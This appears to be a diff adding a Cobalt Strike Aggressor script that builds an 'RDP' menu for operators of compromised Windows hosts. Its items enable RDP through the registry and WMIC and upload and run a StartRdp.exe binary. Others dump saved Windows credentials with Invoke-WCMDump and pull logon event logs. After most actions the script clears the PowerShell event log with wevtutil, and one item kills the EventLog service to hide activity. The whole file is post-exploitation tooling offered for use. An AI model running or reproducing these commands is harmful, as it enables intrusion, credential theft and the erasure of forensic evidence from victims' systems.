@@ -1,0 +1,106 @@
+menu "☆ RDP相关" {
+    item "查询 RDP 状态" {
+		blog($1, "\c9=========== 查询 RDP 状态 ==========");        
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/CheckRdpStatus.ps1"));
+        bpowerpick($1,"CheckRdpStatus");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }        
+    item "获取 RDP 端口" {
+		blog($1, "\c9=========== 获取 RDP 端口 ==========");
+        blog($1, "手动确认：shell netstat -ano | findstr \$RDP端口")                 
+        local('$bid');
+        foreach $bid ($1){
+        blog($1, "Check Rdp Open Port");
+        bpowershell_import($bid, script_resource("scripts/RemoteLogin/RegRdpPort.ps1"));
+        bpowerpick($bid,"RegRdpPort");
+        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+        }
+    }
+    item "开启 RDP 服务 (Powershell)" {
+		blog($1, "\c9=========== 开启 RDP 服务 (Powershell) ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
+        bpowerpick($1,"RegfDenyTSConnections 0");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }
+    item "开启 RDP 服务 (注册表)" {
+		blog($1, "\c9=========== 开启 RDP 服务 (注册表) ==========");
+        $bid = $1['@'];
+        bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
+        bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
+    }
+
+    menu "开启 RDP 服务 (WinAPI)" {
+        item "上传StartRdp" {
+		blog($1, "\c9=========== 上传StartRdp ==========");
+            $bid = $1;
+            $dialog = dialog("上传 StartRdp.exe", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &open-3389);
+            dialog_description($dialog, "使用 WindowsAPI 开启 RDP");
+            drow_text($dialog, "UploadPath",  "上传路径: ");
+            dbutton_action($dialog, "上传");
+            dialog_show($dialog);
+            }
+            sub open-3389{
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("scripts/RemoteLogin/StartRdp.exe"));
+        }
+        item "运行 StartRdp" {
+		blog($1, "\c9=========== 运行 StartRdp ==========");
+            bshell($bid, "StartRdp.exe");
+        }
+        item "删除 StartRdp" {
+		blog($1, "\c9=========== 删除 StartRdp ==========");
+            local('$bid');
+            foreach $bid ($1){
+                bshell($1, "taskkill -f /im StartRdp.exe & del /f /s /q StartRdp.exe");
+                bshell($bid, "del C:\\Windows\\Temp\\StartRdp.exe");
+            }
+        }
+    }
+    item "关闭 RDP 服务 (Powershell)" {
+		blog($1, "\c9=========== 关闭 RDP 服务 (Powershell) ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
+        bpowerpick($1,"RegfDenyTSConnections 1");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }
+    item "关闭 RDP 服务（注册表）" {
+		blog($1, "\c9=========== 关闭 RDP 服务（注册表） ==========");
+        $bid = $1['@'];
+        bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
+        bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
+    }
+    item "查询 RDP 历史登录凭据" {
+		blog($1, "\c9=========== 查询 RDP 历史登录凭据 ==========");
+        bshell($bid,"cmdkey /list");
+    }
+    item "获取 RDP 历史登录凭据" {
+		blog($1, "\c9=========== 获取 RDP 历史登录凭据 ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/Invoke-WCMDump.ps1"));
+        bpowerpick($1, "Invoke-WCMDump");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }
+    item "获取 RDP 登录成功历史日志" {
+		blog($1, "\c9=========== 获取 RDP 登录成功历史日志 ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/EventLogSuccess.ps1"));
+        bpowerpick($1, "EventLogSuccess");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }
+    item "获取 RDP 登录失败历史日志" {
+		blog($1, "\c9=========== 获取 RDP 登录失败历史日志 ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/EventLogFailed.ps1"));
+        bpowerpick($1, "EventLogFailed");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+    }
+    item "查询 RDP 日志路径" {
+		blog($1, "\c9=========== 查询 RDP 日志路径 ==========");
+        bshell($1,"wmic nteventlog get path\,filename\,writeable");
+    }
+    item "关闭 EventlogService 服务" {
+		blog($1, "\c9=========== 关闭 EventlogService 服务 ==========");
+        bpowershell_import($1, script_resource("scripts/RemoteLogin/KillEvenlogService.ps1"));
+        bpowerpick($1,"KillEvenlogService");
+    }
+    item "开启 EventlogService 服务" {
+		blog($1, "\c9=========== 开启 EventlogService 服务 ==========");
+        bshell($bid,"net start eventlog");              
+    } 
+}
